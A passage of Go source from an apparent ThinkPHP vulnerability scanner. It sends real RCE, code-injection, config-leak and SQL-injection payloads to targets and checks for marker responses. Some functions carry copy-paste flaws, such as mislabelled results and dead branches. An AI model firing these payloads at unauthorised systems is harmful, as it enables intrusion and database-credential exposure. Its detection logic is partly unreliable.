		if len(thinkphp.headers) != 0 {
			resp, err = req.C().SetProxyURL(thinkphp.proxyUrl).SetUserAgent(thinkphp.userAgent).SetTimeout(thinkphp.timeOut).R().SetHeaders(thinkphp.headers).Get(fmt.Sprintf("%s%s", thinkphp.url, path))
		} else {
			resp, err = req.C().SetProxyURL(thinkphp.proxyUrl).SetUserAgent(thinkphp.userAgent).SetTimeout(thinkphp.timeOut).R().SetHeaders(thinkphp.headers).Get(fmt.Sprintf("%s%s", thinkphp.url, path))
		}

		if err != nil {
			return "", errors.New(fmt.Sprintf("[!] %s -> %s %s\n", "tp5_templalte_driver_rce检测失败", thinkphp.url, err.Error()))
		}

		if strings.Contains(resp.String(), "56540676a129760a") == true {
			return fmt.Sprintf("[+] %s -> %s%s\n", "tp5_templalte_driver_rce存在漏洞", thinkphp.url, path), nil
		} else {
			continue
		}
	}
	return fmt.Sprintf("[-] %s -> %s\n", "tp5_templalte_driver_rce不存在漏洞", thinkphp.url), nil
}

func (thinkphp *ThinkPHP) TP5_dbinfo_leak() (string, error) {
	var resp *req.Response
	var err error
	paths := []string{
		"/?s=index/think\\config/get&name=database.username",
		"/?s=index/think\\config/get&name=database.database",
		"/?s=index/think\\config/get&name=database.hostport",
		"/?s=index/think\\config/get&name=database.hostname",
	}

	info := []string{
		"", // hostname
		"", // hostport
		"", // database
		"", // username
		"", // password
	}

	for index, path := range paths {
		if len(thinkphp.headers) != 0 {
			resp, err = req.C().SetProxyURL(thinkphp.proxyUrl).SetUserAgent(thinkphp.userAgent).SetTimeout(thinkphp.timeOut).R().SetHeaders(thinkphp.headers).Get(fmt.Sprintf("%s%s", thinkphp.url, path))
		} else {
			resp, err = req.C().SetProxyURL(thinkphp.proxyUrl).SetUserAgent(thinkphp.userAgent).SetTimeout(thinkphp.timeOut).R().SetHeaders(thinkphp.headers).Get(fmt.Sprintf("%s%s", thinkphp.url, path))
		}
		if err != nil {
			return "", errors.New(fmt.Sprintf("[!] %s -> %s %s\n", "tp5_dbinfo_leak检测失败", thinkphp.url, err.Error()))
		}

		if resp.ContentLength <= 2000 {
			info[index] = ""
		} else {
			info[index] = resp.String()
		}
	}

	if info[0] == "" && info[1] == "" && info[2] == "" && info[3] == "" && info[4] == "" {
		if info[0] == info[4] {
			return fmt.Sprintf("[-] %s -> %s\n", "tp5_dbinfo_leak不存在漏洞", thinkphp.url), nil
		}
	} else {
		for _, path := range paths {
			return fmt.Sprintf("[+] %s -> %s%s\n", "tp5_dbinfo_leak存在漏洞", thinkphp.url, path), nil
		}
	}
	return fmt.Sprintf("[-] %s -> %s\n", "tp5_dbinfo_leak不存在漏洞", thinkphp.url), nil
}

func (thinkphp *ThinkPHP) TP2_lite_code_exec() (string, error) {
	var resp *req.Response
	var err error
	path := "/index.php/module/action/param1/$%7B@print%28md5%282333%29%29%7D"
	if len(thinkphp.headers) != 0 {
		resp, err = req.C().SetProxyURL(thinkphp.proxyUrl).SetUserAgent(thinkphp.userAgent).SetTimeout(thinkphp.timeOut).R().SetHeaders(thinkphp.headers).Get(fmt.Sprintf("%s%s", thinkphp.url, path))
	} else {
		resp, err = req.C().SetProxyURL(thinkphp.proxyUrl).SetUserAgent(thinkphp.userAgent).SetTimeout(thinkphp.timeOut).R().SetHeaders(thinkphp.headers).Get(fmt.Sprintf("%s%s", thinkphp.url, path))
	}

	if err != nil {
		return "", errors.New(fmt.Sprintf("[!] %s -> %s %s\n", "tp2_lite_code_exec检测失败", thinkphp.url, err.Error()))
	}

	if strings.Contains(resp.String(), "56540676a129760a3") {
		return fmt.Sprintf("[+] %s -> %s%s\n", "tp2_lite_code_exec存在漏洞", thinkphp.url, path), nil
	} else {
		return fmt.Sprintf("[-] %s -> %s\n", "tp2_lite_code_exec不存在漏洞", thinkphp.url), nil
	}
}

func (thinkphp *ThinkPHP) TP_cache() (string, error) {
	var resp *req.Response
	var err error
	path := "/index.php/Home/Index/index.html"
	payload := "a3=%0d%0avar_dump(\"test\");%0d%0a//"
	if len(thinkphp.headers) != 0 {
		resp, err = req.C().SetProxyURL(thinkphp.proxyUrl).SetUserAgent(thinkphp.userAgent).SetTimeout(thinkphp.timeOut).R().SetHeaders(thinkphp.headers).SetBodyString(payload).Post(fmt.Sprintf("%s%s", thinkphp.url, path))
	} else {
		resp, err = req.C().SetProxyURL(thinkphp.proxyUrl).SetUserAgent(thinkphp.userAgent).SetTimeout(thinkphp.timeOut).R().SetHeaders(map[string]string{
			"User-Agent":   "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36",
			"Content-type": "application/x-www-form-urlencoded",
		}).SetBodyString(payload).Post(fmt.Sprintf("%s%s", thinkphp.url, path))
	}
	if err != nil {
		return "", errors.New(fmt.Sprintf("[!] %s -> %s %s\n", "tp5_dbinfo_leak检测失败", thinkphp.url, err.Error()))
	}

	if strings.Contains(resp.String(), "string(4) \"test\"") {
		return fmt.Sprintf("[+] %s -> %s%s\n", "tp5_dbinfo_leak存在漏洞", thinkphp.url, path), nil
	} else {
		return fmt.Sprintf("[-] %s -> %s\n", "tp5_dbinfo_leak不存在漏洞", thinkphp.url), nil
	}
}

func (thinkphp *ThinkPHP) TP_checkcode_time_sqli() (string, error) {
	var err error

	path := "/index.php?s=/home/user/checkcode/"
	payload := "/index.php?s=/home/user/checkcode/\", \"----------641902708\r\nContent-Disposition: form-data; name=\"couponid\"\r\n\r\n1')UniOn SelEct slEEp(10)#\r\n\r\n----------641902708--"

	OldTime := time.Now()
	if len(thinkphp.headers) != 0 {
		_, err = req.C().SetProxyURL(thinkphp.proxyUrl).SetUserAgent(thinkphp.userAgent).SetTimeout(thinkphp.timeOut).R().SetHeaders(thinkphp.headers).SetBodyString(payload).Post(fmt.Sprintf("%s%s", thinkphp.url, path))
	} else {
		_, err = req.C().SetProxyURL(thinkphp.proxyUrl).SetUserAgent(thinkphp.userAgent).SetTimeout(thinkphp.timeOut).R().SetHeaders(map[string]string{
			"User-Agent":   "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36",
			"Content-Type": "multipart/form-data; boundary=--------641902708",
			"Accept":       "gzip, deflate, sdch",
		}).SetBodyString(payload).Post(fmt.Sprintf("%s%s", thinkphp.url, path))
	}

	if err != nil {
		return "", errors.New(fmt.Sprintf("[!] %s -> %s %s\n", "tp_checkcode_time_sqli检测失败", thinkphp.url, err.Error()))
	}

	if time.Now().Sub(OldTime) >= time.Second*8 {
		return fmt.Sprintf("[+] %s -> %s%s\n", "tp_checkcode_time_sqli存在漏洞", thinkphp.url, path), nil
	} else {
		return fmt.Sprintf("[-] %s -> %s\n", "tp_checkcode_time_sqli不存在漏洞", thinkphp.url), nil
	}
}

func (thinkphp *ThinkPHP) TP_multi_sql_leak() (string, error) {
	var resp *req.Response
	var err error

	paths := []string{
		"/index.php?s=/home/shopcart/getPricetotal/tag/1%27",
		"/index.php?s=/home/shopcart/getpriceNum/id/1%27",
		"/index.php?s=/home/user/cut/id/1%27",
		"/index.php?s=/home/service/index/id/1%27",
		"/index.php?s=/home/pay/chongzhi/orderid/1%27",
		"/index.php?s=/home/order/complete/id/1%27",
		"/index.php?s=/home/order/detail/id/1%27",
		"/index.php?s=/home/order/cancel/id/1%27",
	}

	for _, path := range paths {
		if len(thinkphp.headers) != 0 {
			resp, err = req.C().SetProxyURL(thinkphp.proxyUrl).SetUserAgent(thinkphp.userAgent).SetTimeout(thinkphp.timeOut).R().SetHeaders(thinkphp.headers).Get(fmt.Sprintf("%s%s", thinkphp.url, path))
		} else {
			resp, err = req.C().SetProxyURL(thinkphp.proxyUrl).SetUserAgent(thinkphp.userAgent).SetTimeout(thinkphp.timeOut).R().SetHeaders(thinkphp.headers).Get(fmt.Sprintf("%s%s", thinkphp.url, path))
		}

		if err != nil {
			return "", errors.New(fmt.Sprintf("[!] %s -> %s %s\n", "tp_multi_sql_leak检测失败", thinkphp.url, err.Error()))
		}

		if strings.Contains(resp.String(), "SQL syntax") {
			return fmt.Sprintf("[+] %s -> %s%s\n", "tp_multi_sql_leak存在漏洞", thinkphp.url, path), nil
		} else {
			continue
		}
	}
	return fmt.Sprintf("[-] %s -> %s\n", "tp_multi_sql_leak不存在漏洞", thinkphp.url), nil
}

func (thinkphp *ThinkPHP) TP_pay_orderid_sqli() (string, error) {
	var resp *req.Response
	var err error
	path := "/index.php?s=/home/pay/index/orderid/1%27)UnIoN/**/All/**/SeLeCT/**/Md5(2333)--+"

	if len(thinkphp.headers) != 0 {
		resp, err = req.C().SetProxyURL(thinkphp.proxyUrl).SetUserAgent(thinkphp.userAgent).SetTimeout(thinkphp.timeOut).R().SetHeaders(thinkphp.headers).Get(fmt.Sprintf("%s%s", thinkphp.url, path))
	} else {
		resp, err = req.C().SetProxyURL(thinkphp.proxyUrl).SetUserAgent(thinkphp.userAgent).SetTimeout(thinkphp.timeOut).R().SetHeaders(thinkphp.headers).Get(fmt.Sprintf("%s%s", thinkphp.url, path))
	}

	if err != nil {
		return "", errors.New(fmt.Sprintf("[!] %s -> %s %s\n", "tp_pay_orderid_sqli检测失败", thinkphp.url, err.Error()))
	}

	if strings.Contains(resp.String(), "56540676a129760a") {
		return fmt.Sprintf("[+] %s -> %s%s\n", "tp_pay_orderid_sqli存在漏洞", thinkphp.url, path), nil
	} else {
		return fmt.Sprintf("[-] %s -> %s\n", "tp_pay_orderid_sqli不存在漏洞", thinkphp.url), nil
	}
}

func (thinkphp *ThinkPHP) TP_update_sql() (string, error) {
	var resp *req.Response
	var err error
	path := "/index.php?money[]=1123&user=liao&id[0]=bind&id[1]=0%20and%20(updatexml(1,concat(0x7e,(select%20md5(520)),0x7e),1))"

	if len(thinkphp.headers) != 0 {
		resp, err = req.C().SetProxyURL(thinkphp.proxyUrl).SetUserAgent(thinkphp.userAgent).SetTimeout(thinkphp.timeOut).R().SetHeaders(thinkphp.headers).Get(fmt.Sprintf("%s%s", thinkphp.url, path))
	} else {
		resp, err = req.C().SetProxyURL(thinkphp.proxyUrl).SetUserAgent(thinkphp.userAgent).SetTimeout(thinkphp.timeOut).R().SetHeaders(thinkphp.headers).Get(fmt.Sprintf("%s%s", thinkphp.url, path))
	}

	if err != nil {
		return "", errors.New(fmt.Sprintf("[!] %s -> %s %s\n", "tp_update_sql检测失败", thinkphp.url, err.Error()))
	}

	if strings.Contains(resp.String(), "cf67355a3333e6e143439161adc2d82") {
		return fmt.Sprintf("[+] %s -> %s%s\n", "tp_update_sql存在漏洞", thinkphp.url, path), nil
	} else {
		return fmt.Sprintf("[-] %s -> %s\n", "tp_update_sql不存在漏洞", thinkphp.url), nil
	}
}

func (thinkphp *ThinkPHP) TP_view_recent_xff_sqli() (string, error) {
	var resp *req.Response
	var err error
	path := "/index.php?s=/home/article/view_recent/name/1"
	if len(thinkphp.headers) != 0 {
		resp, err = req.C().SetProxyURL(thinkphp.proxyUrl).SetUserAgent(thinkphp.userAgent).SetTimeout(thinkphp.timeOut).R().SetHeaders(thinkphp.headers).Get(fmt.Sprintf("%s%s", thinkphp.url, path))
	} else {
		resp, err = req.C().SetProxyURL(thinkphp.proxyUrl).SetUserAgent(thinkphp.userAgent).SetTimeout(thinkphp.timeOut).R().SetHeaders(map[string]string{
			"User-Agent":      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36",
			"X-Forwarded-For": "1')And/**/ExtractValue(1,ConCat(0x5c,(sElEct/**/Md5(2333))))#",
		}).Get(fmt.Sprintf("%s%s", thinkphp.url, path))
	}
	if err != nil {
		return "", errors.New(fmt.Sprintf("[!] %s -> %s %s\n", "tp_view_recent_xff_sqli检测失败", thinkphp.url, err.Error()))
	}

	if strings.Contains(resp.String(), "56540676a129760a") {
		return fmt.Sprintf("[+] %s -> %s%s\n", "tp_view_recent_xff_sqli存在漏洞", thinkphp.url, path), nil
	} else {
		return fmt.Sprintf("[-] %s -> %s\n", "tp_view_recent_xff_sqli不存在漏洞", thinkphp.url), nil
	}
}
